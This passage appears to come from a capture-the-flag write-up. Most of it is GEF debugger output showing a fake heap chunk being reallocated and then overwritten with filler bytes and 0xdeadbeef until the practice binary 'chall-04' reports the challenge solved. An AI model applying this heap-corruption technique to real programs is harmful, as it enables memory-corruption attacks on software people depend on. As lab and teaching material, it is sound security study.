$rax   : 0x000055d952dc52e0  →  0x00007f54f322cd00  →  0x000055d952dc71e0  →  0x0000000000000000
$rbx   : 0x0          	 
$rcx   : 0x00007f54f322cca0  →  0x0000000000000000
$rdx   : 0x0          	 
$rsp   : 0x00007ffd1a01b870  →  0x0000000000000000
$rbp   : 0x00007ffd1a01b8b0  →  0x0000000000000001
$rsi   : 0x0          	 
$rdi   : 0x6d         	 
$rip   : 0x000055d952496422  →  <main+373> mov QWORD PTR [rbp-0x8], rax
$r8	: 0x0          	 
$r9	: 0x0          	 
$r10   : 0x000055d952dc58c0  →  0x00000000000005f0
$r11   : 0x00007f54f322cca0  →  0x0000000000000000
$r12   : 0x00007ffd1a01b9c8  →  0x00007ffd1a01c486  →  "./chall-04"
$r13   : 0x000055d9524962ad  →  <main+0> endbr64
$r14   : 0x000055d952498d70  →  0x000055d952496200  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007f54f3367020  →  0x00007f54f33682e0  →  0x000055d952495000  →   jg 0x55d952495047
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffd1a01b870│+0x0000: 0x0000000000000000     ← $rsp
0x00007ffd1a01b878│+0x0008: 0x000055d952dc52a0  →  "000000000000000000000000000000000000000000000000"
0x00007ffd1a01b880│+0x0010: 0x000055d952dc57b0  →  0x0000000000000000
0x00007ffd1a01b888│+0x0018: 0x000055d952dc58c0  →  0x00000000000005f0
0x00007ffd1a01b890│+0x0020: 0x0000000000000040 ("@"?)
0x00007ffd1a01b898│+0x0028: 0x000055d952dc52e0  →  0x00007f54f322cd00  →  0x000055d952dc71e0  →  0x0000000000000000
0x00007ffd1a01b8a0│+0x0030: 0x00000000000005e0
0x00007ffd1a01b8a8│+0x0038: 0x00007f54f334f080  →  <dl_main+0> endbr64
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x55d952496416 <main+361>   	mov	rax, QWORD PTR [rbp-0x10]
   0x55d95249641a <main+365>   	mov	rdi, rax
   0x55d95249641d <main+368>   	call   0x55d952496140 <malloc@plt>
 → 0x55d952496422 <main+373>   	mov	QWORD PTR [rbp-0x8], rax
   0x55d952496426 <main+377>   	lea	rax, [rip+0xc5b]    	# 0x55d952497088
   0x55d95249642d <main+384>   	mov	rdi, rax
   0x55d952496430 <main+387>   	call   0x55d9524960e0 <puts@plt>
   0x55d952496435 <main+392>   	mov	rdx, QWORD PTR [rbp-0x10]
   0x55d952496439 <main+396>   	mov	rax, QWORD PTR [rbp-0x8]
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall-04", stopped 0x55d952496422 in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x55d952496422 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  p $rax
$2 = 0x55d952dc52e0
gef➤  heap bins
────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────
All tcachebins are empty
─────────────────────────────── Fastbins for arena at 0x7f54f322cca0 ───────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
───────────────────────────── Unsorted Bin for arena at 0x7f54f322cca0 ─────────────────────────────
[+] Found 0 chunks in unsorted bin.
────────────────────────────── Small Bins for arena at 0x7f54f322cca0 ──────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
────────────────────────────── Large Bins for arena at 0x7f54f322cca0 ──────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  x/20g 0x55d952dc52d0
0x55d952dc52d0:    0x0    0x5f1
0x55d952dc52e0:    0x7f54f322cd00    0x7f54f322cd00
0x55d952dc52f0:    0x0    0x0
0x55d952dc5300:    0x0    0x0
0x55d952dc5310:    0x0    0x0
0x55d952dc5320:    0x0    0x0
0x55d952dc5330:    0x0    0x0
0x55d952dc5340:    0x0    0x0
0x55d952dc5350:    0x0    0x0
0x55d952dc5360:    0x0    0x0
```

So we see, we were able to reallocate our fake chunk. All that is left, is to write `0x55d952dc57b0 - 0x55d952dc52e0 = 0x4d0` bytes, followed by `0xdeadbeef` to it, to solve the challenge:

```
Breakpoint 6, 0x000055d95249644a in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x4d4        	 
$rbx   : 0x0          	 
$rcx   : 0x00007f54f30f4951  →  0x5777fffff0003d48 ("H="?)
$rdx   : 0x5e0        	 
$rsp   : 0x00007ffd1a01b870  →  0x0000000000000000
$rbp   : 0x00007ffd1a01b8b0  →  0x0000000000000001
$rsi   : 0x000055d952dc52e0  →  "00000000000000000000000000000000000000000000000000[...]"
$rdi   : 0x0          	 
$rip   : 0x000055d95249644a  →  <main+413> mov rax, QWORD PTR [rbp-0x30]
$r8	: 0x0          	 
$r9	: 0x0          	 
$r10   : 0x000055d952dc58c0  →  0x00000000000005f0
$r11   : 0x246        	 
$r12   : 0x00007ffd1a01b9c8  →  0x00007ffd1a01c486  →  "./chall-04"
$r13   : 0x000055d9524962ad  →  <main+0> endbr64
$r14   : 0x000055d952498d70  →  0x000055d952496200  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007f54f3367020  →  0x00007f54f33682e0  →  0x000055d952495000  →   jg 0x55d952495047
$eflags: [zero CARRY PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffd1a01b870│+0x0000: 0x0000000000000000     ← $rsp
0x00007ffd1a01b878│+0x0008: 0x000055d952dc52a0  →  "000000000000000000000000000000000000000000000000"
0x00007ffd1a01b880│+0x0010: 0x000055d952dc57b0  →  0x00000000deadbeef
0x00007ffd1a01b888│+0x0018: 0x000055d952dc58c0  →  0x00000000000005f0
0x00007ffd1a01b890│+0x0020: 0x0000000000000040 ("@"?)
0x00007ffd1a01b898│+0x0028: 0x000055d952dc52e0  →  "00000000000000000000000000000000000000000000000000[...]"
0x00007ffd1a01b8a0│+0x0030: 0x00000000000005e0
0x00007ffd1a01b8a8│+0x0038: 0x000055d952dc52e0  →  "00000000000000000000000000000000000000000000000000[...]"
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x55d95249643d <main+400>   	mov	rsi, rax
   0x55d952496440 <main+403>   	mov	edi, 0x0
   0x55d952496445 <main+408>   	call   0x55d952496120 <read@plt>
 → 0x55d95249644a <main+413>   	mov	rax, QWORD PTR [rbp-0x30]
   0x55d95249644e <main+417>   	mov	eax, DWORD PTR [rax]
   0x55d952496450 <main+419>   	cmp	eax, 0xdeadbeef
   0x55d952496455 <main+424>   	jne	0x55d952496466 <main+441>
   0x55d952496457 <main+426>   	lea	rax, [rip+0xc45]    	# 0x55d9524970a3
   0x55d95249645e <main+433>   	mov	rdi, rax
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall-04", stopped 0x55d95249644a in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x55d95249644a → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/20g 0x55d952dc52d0
0x55d952dc52d0:    0x0    0x5f1
0x55d952dc52e0:    0x3030303030303030    0x3030303030303030
0x55d952dc52f0:    0x3030303030303030    0x3030303030303030
0x55d952dc5300:    0x3030303030303030    0x3030303030303030
0x55d952dc5310:    0x3030303030303030    0x3030303030303030
0x55d952dc5320:    0x3030303030303030    0x3030303030303030
0x55d952dc5330:    0x3030303030303030    0x3030303030303030
0x55d952dc5340:    0x3030303030303030    0x3030303030303030
0x55d952dc5350:    0x3030303030303030    0x3030303030303030
0x55d952dc5360:    0x3030303030303030    0x3030303030303030
gef➤  x/200g 0x55d952dc52d0
0x55d952dc52d0:    0x0    0x5f1
0x55d952dc52e0:    0x3030303030303030    0x3030303030303030
0x55d952dc52f0:    0x3030303030303030    0x3030303030303030
0x55d952dc5300:    0x3030303030303030    0x3030303030303030
0x55d952dc5310:    0x3030303030303030    0x3030303030303030
0x55d952dc5320:    0x3030303030303030    0x3030303030303030
0x55d952dc5330:    0x3030303030303030    0x3030303030303030
0x55d952dc5340:    0x3030303030303030    0x3030303030303030
0x55d952dc5350:    0x3030303030303030    0x3030303030303030
0x55d952dc5360:    0x3030303030303030    0x3030303030303030
0x55d952dc5370:    0x3030303030303030    0x3030303030303030
0x55d952dc5380:    0x3030303030303030    0x3030303030303030
0x55d952dc5390:    0x3030303030303030    0x3030303030303030
0x55d952dc53a0:    0x3030303030303030    0x3030303030303030
0x55d952dc53b0:    0x3030303030303030    0x3030303030303030
0x55d952dc53c0:    0x3030303030303030    0x3030303030303030
0x55d952dc53d0:    0x3030303030303030    0x3030303030303030
0x55d952dc53e0:    0x3030303030303030    0x3030303030303030
0x55d952dc53f0:    0x3030303030303030    0x3030303030303030
0x55d952dc5400:    0x3030303030303030    0x3030303030303030
0x55d952dc5410:    0x3030303030303030    0x3030303030303030
0x55d952dc5420:    0x3030303030303030    0x3030303030303030
0x55d952dc5430:    0x3030303030303030    0x3030303030303030
0x55d952dc5440:    0x3030303030303030    0x3030303030303030
0x55d952dc5450:    0x3030303030303030    0x3030303030303030
0x55d952dc5460:    0x3030303030303030    0x3030303030303030
0x55d952dc5470:    0x3030303030303030    0x3030303030303030
0x55d952dc5480:    0x3030303030303030    0x3030303030303030
0x55d952dc5490:    0x3030303030303030    0x3030303030303030
0x55d952dc54a0:    0x3030303030303030    0x3030303030303030
0x55d952dc54b0:    0x3030303030303030    0x3030303030303030
0x55d952dc54c0:    0x3030303030303030    0x3030303030303030
0x55d952dc54d0:    0x3030303030303030    0x3030303030303030
0x55d952dc54e0:    0x3030303030303030    0x3030303030303030
0x55d952dc54f0:    0x3030303030303030    0x3030303030303030
0x55d952dc5500:    0x3030303030303030    0x3030303030303030
0x55d952dc5510:    0x3030303030303030    0x3030303030303030
0x55d952dc5520:    0x3030303030303030    0x3030303030303030
0x55d952dc5530:    0x3030303030303030    0x3030303030303030
0x55d952dc5540:    0x3030303030303030    0x3030303030303030
0x55d952dc5550:    0x3030303030303030    0x3030303030303030
0x55d952dc5560:    0x3030303030303030    0x3030303030303030
0x55d952dc5570:    0x3030303030303030    0x3030303030303030
0x55d952dc5580:    0x3030303030303030    0x3030303030303030
0x55d952dc5590:    0x3030303030303030    0x3030303030303030
0x55d952dc55a0:    0x3030303030303030    0x3030303030303030
0x55d952dc55b0:    0x3030303030303030    0x3030303030303030
0x55d952dc55c0:    0x3030303030303030    0x3030303030303030
0x55d952dc55d0:    0x3030303030303030    0x3030303030303030
0x55d952dc55e0:    0x3030303030303030    0x3030303030303030
0x55d952dc55f0:    0x3030303030303030    0x3030303030303030
0x55d952dc5600:    0x3030303030303030    0x3030303030303030
0x55d952dc5610:    0x3030303030303030    0x3030303030303030
0x55d952dc5620:    0x3030303030303030    0x3030303030303030
0x55d952dc5630:    0x3030303030303030    0x3030303030303030
0x55d952dc5640:    0x3030303030303030    0x3030303030303030
0x55d952dc5650:    0x3030303030303030    0x3030303030303030
0x55d952dc5660:    0x3030303030303030    0x3030303030303030
0x55d952dc5670:    0x3030303030303030    0x3030303030303030
0x55d952dc5680:    0x3030303030303030    0x3030303030303030
0x55d952dc5690:    0x3030303030303030    0x3030303030303030
0x55d952dc56a0:    0x3030303030303030    0x3030303030303030
0x55d952dc56b0:    0x3030303030303030    0x3030303030303030
0x55d952dc56c0:    0x3030303030303030    0x3030303030303030
0x55d952dc56d0:    0x3030303030303030    0x3030303030303030
0x55d952dc56e0:    0x3030303030303030    0x3030303030303030
0x55d952dc56f0:    0x3030303030303030    0x3030303030303030
0x55d952dc5700:    0x3030303030303030    0x3030303030303030
0x55d952dc5710:    0x3030303030303030    0x3030303030303030
0x55d952dc5720:    0x3030303030303030    0x3030303030303030
0x55d952dc5730:    0x3030303030303030    0x3030303030303030
0x55d952dc5740:    0x3030303030303030    0x3030303030303030
0x55d952dc5750:    0x3030303030303030    0x3030303030303030
0x55d952dc5760:    0x3030303030303030    0x3030303030303030
0x55d952dc5770:    0x3030303030303030    0x3030303030303030
0x55d952dc5780:    0x3030303030303030    0x3030303030303030
0x55d952dc5790:    0x3030303030303030    0x3030303030303030
0x55d952dc57a0:    0x3030303030303030    0x3030303030303030
0x55d952dc57b0:    0xdeadbeef    0x0
0x55d952dc57c0:    0x0    0x0
0x55d952dc57d0:    0x0    0x0
0x55d952dc57e0:    0x0    0x0
0x55d952dc57f0:    0x0    0x0
0x55d952dc5800:    0x0    0x0
0x55d952dc5810:    0x0    0x0
0x55d952dc5820:    0x0    0x0
0x55d952dc5830:    0x0    0x0
0x55d952dc5840:    0x0    0x0
0x55d952dc5850:    0x0    0x0
0x55d952dc5860:    0x0    0x0
0x55d952dc5870:    0x0    0x0
0x55d952dc5880:    0x0    0x0
0x55d952dc5890:    0x0    0x0
0x55d952dc58a0:    0x0    0x0
0x55d952dc58b0:    0x0    0x511
0x55d952dc58c0:    0x5f0    0x21
0x55d952dc58d0:    0x0    0x0
0x55d952dc58e0:    0x0    0x21
0x55d952dc58f0:    0x0    0x0
0x55d952dc5900:    0x0    0x0
gef➤  si
0x000055d95249644e in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x000055d952dc57b0  →  0x00000000deadbeef
$rbx   : 0x0          	 
$rcx   : 0x00007f54f30f4951  →  0x5777fffff0003d48 ("H="?)
$rdx   : 0x5e0        	 
$rsp   : 0x00007ffd1a01b870  →  0x0000000000000000
$rbp   : 0x00007ffd1a01b8b0  →  0x0000000000000001
$rsi   : 0x000055d952dc52e0  →  "00000000000000000000000000000000000000000000000000[...]"
$rdi   : 0x0          	 
$rip   : 0x000055d95249644e  →  <main+417> mov eax, DWORD PTR [rax]
$r8	: 0x0          	 
$r9	: 0x0          	 
$r10   : 0x000055d952dc58c0  →  0x00000000000005f0
$r11   : 0x246        	 
$r12   : 0x00007ffd1a01b9c8  →  0x00007ffd1a01c486  →  "./chall-04"
$r13   : 0x000055d9524962ad  →  <main+0> endbr64
$r14   : 0x000055d952498d70  →  0x000055d952496200  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007f54f3367020  →  0x00007f54f33682e0  →  0x000055d952495000  →   jg 0x55d952495047
$eflags: [zero CARRY PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffd1a01b870│+0x0000: 0x0000000000000000     ← $rsp
0x00007ffd1a01b878│+0x0008: 0x000055d952dc52a0  →  "000000000000000000000000000000000000000000000000"
0x00007ffd1a01b880│+0x0010: 0x000055d952dc57b0  →  0x00000000deadbeef
0x00007ffd1a01b888│+0x0018: 0x000055d952dc58c0  →  0x00000000000005f0
0x00007ffd1a01b890│+0x0020: 0x0000000000000040 ("@"?)
0x00007ffd1a01b898│+0x0028: 0x000055d952dc52e0  →  "00000000000000000000000000000000000000000000000000[...]"
0x00007ffd1a01b8a0│+0x0030: 0x00000000000005e0
0x00007ffd1a01b8a8│+0x0038: 0x000055d952dc52e0  →  "00000000000000000000000000000000000000000000000000[...]"
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x55d952496440 <main+403>   	mov	edi, 0x0
   0x55d952496445 <main+408>   	call   0x55d952496120 <read@plt>
   0x55d95249644a <main+413>   	mov	rax, QWORD PTR [rbp-0x30]
 → 0x55d95249644e <main+417>   	mov	eax, DWORD PTR [rax]
   0x55d952496450 <main+419>   	cmp	eax, 0xdeadbeef
   0x55d952496455 <main+424>   	jne	0x55d952496466 <main+441>
   0x55d952496457 <main+426>   	lea	rax, [rip+0xc45]    	# 0x55d9524970a3
   0x55d95249645e <main+433>   	mov	rdi, rax
   0x55d952496461 <main+436>   	call   0x55d9524960e0 <puts@plt>
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall-04", stopped 0x55d95249644e in main (), reason: SINGLE STEP
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x55d95249644e → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  p $rax
$3 = 0x55d952dc57b0
gef➤  x/g $rax
0x55d952dc57b0:    0xdeadbeef
gef➤  si
0x000055d952496450 in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xdeadbeef   	 
$rbx   : 0x0          	 
$rcx   : 0x00007f54f30f4951  →  0x5777fffff0003d48 ("H="?)
$rdx   : 0x5e0        	 
$rsp   : 0x00007ffd1a01b870  →  0x0000000000000000
$rbp   : 0x00007ffd1a01b8b0  →  0x0000000000000001
$rsi   : 0x000055d952dc52e0  →  "00000000000000000000000000000000000000000000000000[...]"
$rdi   : 0x0          	 
$rip   : 0x000055d952496450  →  <main+419> cmp eax, 0xdeadbeef
$r8	: 0x0          	 
$r9	: 0x0          	 
$r10   : 0x000055d952dc58c0  →  0x00000000000005f0
$r11   : 0x246        	 
$r12   : 0x00007ffd1a01b9c8  →  0x00007ffd1a01c486  →  "./chall-04"
$r13   : 0x000055d9524962ad  →  <main+0> endbr64
$r14   : 0x000055d952498d70  →  0x000055d952496200  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007f54f3367020  →  0x00007f54f33682e0  →  0x000055d952495000  →   jg 0x55d952495047
$eflags: [zero CARRY PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffd1a01b870│+0x0000: 0x0000000000000000     ← $rsp
0x00007ffd1a01b878│+0x0008: 0x000055d952dc52a0  →  "000000000000000000000000000000000000000000000000"
0x00007ffd1a01b880│+0x0010: 0x000055d952dc57b0  →  0x00000000deadbeef
0x00007ffd1a01b888│+0x0018: 0x000055d952dc58c0  →  0x00000000000005f0
0x00007ffd1a01b890│+0x0020: 0x0000000000000040 ("@"?)
0x00007ffd1a01b898│+0x0028: 0x000055d952dc52e0  →  "00000000000000000000000000000000000000000000000000[...]"
0x00007ffd1a01b8a0│+0x0030: 0x00000000000005e0
0x00007ffd1a01b8a8│+0x0038: 0x000055d952dc52e0  →  "00000000000000000000000000000000000000000000000000[...]"
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x55d952496445 <main+408>   	call   0x55d952496120 <read@plt>
   0x55d95249644a <main+413>   	mov	rax, QWORD PTR [rbp-0x30]
   0x55d95249644e <main+417>   	mov	eax, DWORD PTR [rax]
 → 0x55d952496450 <main+419>   	cmp	eax, 0xdeadbeef
   0x55d952496455 <main+424>   	jne	0x55d952496466 <main+441>
   0x55d952496457 <main+426>   	lea	rax, [rip+0xc45]    	# 0x55d9524970a3
   0x55d95249645e <main+433>   	mov	rdi, rax
   0x55d952496461 <main+436>   	call   0x55d9524960e0 <puts@plt>
   0x55d952496466 <main+441>   	leave  
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall-04", stopped 0x55d952496450 in main (), reason: SINGLE STEP
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x55d952496450 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  p $eax
$4 = 0xdeadbeef
gef➤  si
0x000055d952496455 in main ()



[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xdeadbeef   	 
$rbx   : 0x0          	 
$rcx   : 0x00007f54f30f4951  →  0x5777fffff0003d48 ("H="?)
$rdx   : 0x5e0        	 
$rsp   : 0x00007ffd1a01b870  →  0x0000000000000000
$rbp   : 0x00007ffd1a01b8b0  →  0x0000000000000001
$rsi   : 0x000055d952dc52e0  →  "00000000000000000000000000000000000000000000000000[...]"
$rdi   : 0x0          	 
$rip   : 0x000055d952496455  →  <main+424> jne 0x55d952496466 <main+441>
$r8	: 0x0          	 
$r9	: 0x0          	 
$r10   : 0x000055d952dc58c0  →  0x00000000000005f0
$r11   : 0x246        	 
$r12   : 0x00007ffd1a01b9c8  →  0x00007ffd1a01c486  →  "./chall-04"
$r13   : 0x000055d9524962ad  →  <main+0> endbr64
$r14   : 0x000055d952498d70  →  0x000055d952496200  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007f54f3367020  →  0x00007f54f33682e0  →  0x000055d952495000  →   jg 0x55d952495047
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffd1a01b870│+0x0000: 0x0000000000000000     ← $rsp
0x00007ffd1a01b878│+0x0008: 0x000055d952dc52a0  →  "000000000000000000000000000000000000000000000000"
0x00007ffd1a01b880│+0x0010: 0x000055d952dc57b0  →  0x00000000deadbeef
0x00007ffd1a01b888│+0x0018: 0x000055d952dc58c0  →  0x00000000000005f0
0x00007ffd1a01b890│+0x0020: 0x0000000000000040 ("@"?)
0x00007ffd1a01b898│+0x0028: 0x000055d952dc52e0  →  "00000000000000000000000000000000000000000000000000[...]"
0x00007ffd1a01b8a0│+0x0030: 0x00000000000005e0
0x00007ffd1a01b8a8│+0x0038: 0x000055d952dc52e0  →  "00000000000000000000000000000000000000000000000000[...]"
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x55d95249644a <main+413>   	mov	rax, QWORD PTR [rbp-0x30]
   0x55d95249644e <main+417>   	mov	eax, DWORD PTR [rax]
   0x55d952496450 <main+419>   	cmp	eax, 0xdeadbeef
 → 0x55d952496455 <main+424>   	jne	0x55d952496466 <main+441>    NOT taken [Reason: !(!Z)]
   0x55d952496457 <main+426>   	lea	rax, [rip+0xc45]    	# 0x55d9524970a3
   0x55d95249645e <main+433>   	mov	rdi, rax
   0x55d952496461 <main+436>   	call   0x55d9524960e0 <puts@plt>
   0x55d952496466 <main+441>   	leave  
   0x55d952496467 <main+442>   	ret    
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall-04", stopped 0x55d952496455 in main (), reason: SINGLE STEP
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x55d952496455 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  si
0x000055d952496457 in main ()





[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xdeadbeef   	 
$rbx   : 0x0          	 
$rcx   : 0x00007f54f30f4951  →  0x5777fffff0003d48 ("H="?)
$rdx   : 0x5e0        	 
$rsp   : 0x00007ffd1a01b870  →  0x0000000000000000
$rbp   : 0x00007ffd1a01b8b0  →  0x0000000000000001
$rsi   : 0x000055d952dc52e0  →  "00000000000000000000000000000000000000000000000000[...]"
$rdi   : 0x0          	 
$rip   : 0x000055d952496457  →  <main+426> lea rax, [rip+0xc45]    	# 0x55d9524970a3
$r8	: 0x0          	 
$r9	: 0x0          	 
$r10   : 0x000055d952dc58c0  →  0x00000000000005f0
$r11   : 0x246        	 
$r12   : 0x00007ffd1a01b9c8  →  0x00007ffd1a01c486  →  "./chall-04"
$r13   : 0x000055d9524962ad  →  <main+0> endbr64
$r14   : 0x000055d952498d70  →  0x000055d952496200  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007f54f3367020  →  0x00007f54f33682e0  →  0x000055d952495000  →   jg 0x55d952495047
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffd1a01b870│+0x0000: 0x0000000000000000     ← $rsp
0x00007ffd1a01b878│+0x0008: 0x000055d952dc52a0  →  "000000000000000000000000000000000000000000000000"
0x00007ffd1a01b880│+0x0010: 0x000055d952dc57b0  →  0x00000000deadbeef
0x00007ffd1a01b888│+0x0018: 0x000055d952dc58c0  →  0x00000000000005f0
0x00007ffd1a01b890│+0x0020: 0x0000000000000040 ("@"?)
0x00007ffd1a01b898│+0x0028: 0x000055d952dc52e0  →  "00000000000000000000000000000000000000000000000000[...]"
0x00007ffd1a01b8a0│+0x0030: 0x00000000000005e0
0x00007ffd1a01b8a8│+0x0038: 0x000055d952dc52e0  →  "00000000000000000000000000000000000000000000000000[...]"
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x55d95249644e <main+417>   	mov	eax, DWORD PTR [rax]
   0x55d952496450 <main+419>   	cmp	eax, 0xdeadbeef
   0x55d952496455 <main+424>   	jne	0x55d952496466 <main+441>
 → 0x55d952496457 <main+426>   	lea	rax, [rip+0xc45]    	# 0x55d9524970a3
   0x55d95249645e <main+433>   	mov	rdi, rax
   0x55d952496461 <main+436>   	call   0x55d9524960e0 <puts@plt>
   0x55d952496466 <main+441>   	leave  
   0x55d952496467 <main+442>   	ret    
   0x55d952496468 <_fini+0>    	endbr64
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall-04", stopped 0x55d952496457 in main (), reason: SINGLE STEP
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x55d952496457 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  si
0x000055d95249645e in main ()





[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x000055d9524970a3  →  "You solved the chall!\n"
$rbx   : 0x0          	 
$rcx   : 0x00007f54f30f4951  →  0x5777fffff0003d48 ("H="?)
$rdx   : 0x5e0        	 
$rsp   : 0x00007ffd1a01b870  →  0x0000000000000000
$rbp   : 0x00007ffd1a01b8b0  →  0x0000000000000001
$rsi   : 0x000055d952dc52e0  →  "00000000000000000000000000000000000000000000000000[...]"
$rdi   : 0x0          	 
$rip   : 0x000055d95249645e  →  <main+433> mov rdi, rax
$r8	: 0x0          	 
$r9	: 0x0          	 
$r10   : 0x000055d952dc58c0  →  0x00000000000005f0
$r11   : 0x246        	 
$r12   : 0x00007ffd1a01b9c8  →  0x00007ffd1a01c486  →  "./chall-04"
$r13   : 0x000055d9524962ad  →  <main+0> endbr64
$r14   : 0x000055d952498d70  →  0x000055d952496200  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007f54f3367020  →  0x00007f54f33682e0  →  0x000055d952495000  →   jg 0x55d952495047
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffd1a01b870│+0x0000: 0x0000000000000000     ← $rsp
0x00007ffd1a01b878│+0x0008: 0x000055d952dc52a0  →  "000000000000000000000000000000000000000000000000"
0x00007ffd1a01b880│+0x0010: 0x000055d952dc57b0  →  0x00000000deadbeef
0x00007ffd1a01b888│+0x0018: 0x000055d952dc58c0  →  0x00000000000005f0
0x00007ffd1a01b890│+0x0020: 0x0000000000000040 ("@"?)
0x00007ffd1a01b898│+0x0028: 0x000055d952dc52e0  →  "00000000000000000000000000000000000000000000000000[...]"
0x00007ffd1a01b8a0│+0x0030: 0x00000000000005e0
0x00007ffd1a01b8a8│+0x0038: 0x000055d952dc52e0  →  "00000000000000000000000000000000000000000000000000[...]"
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x55d952496450 <main+419>   	cmp	eax, 0xdeadbeef
   0x55d952496455 <main+424>   	jne	0x55d952496466 <main+441>
   0x55d952496457 <main+426>   	lea	rax, [rip+0xc45]    	# 0x55d9524970a3
 → 0x55d95249645e <main+433>   	mov	rdi, rax
   0x55d952496461 <main+436>   	call   0x55d9524960e0 <puts@plt>
   0x55d952496466 <main+441>   	leave  
   0x55d952496467 <main+442>   	ret    
   0x55d952496468 <_fini+0>    	endbr64
   0x55d95249646c <_fini+4>    	sub	rsp, 0x8
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall-04", stopped 0x55d95249645e in main (), reason: SINGLE STEP
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x55d95249645e → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  si
0x000055d952496461 in main ()





[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x000055d9524970a3  →  "You solved the chall!\n"
$rbx   : 0x0          	 
$rcx   : 0x00007f54f30f4951  →  0x5777fffff0003d48 ("H="?)
$rdx   : 0x5e0        	 
$rsp   : 0x00007ffd1a01b870  →  0x0000000000000000
$rbp   : 0x00007ffd1a01b8b0  →  0x0000000000000001
$rsi   : 0x000055d952dc52e0  →  "00000000000000000000000000000000000000000000000000[...]"
$rdi   : 0x000055d9524970a3  →  "You solved the chall!\n"
$rip   : 0x000055d952496461  →  <main+436> call 0x55d9524960e0 <puts@plt>
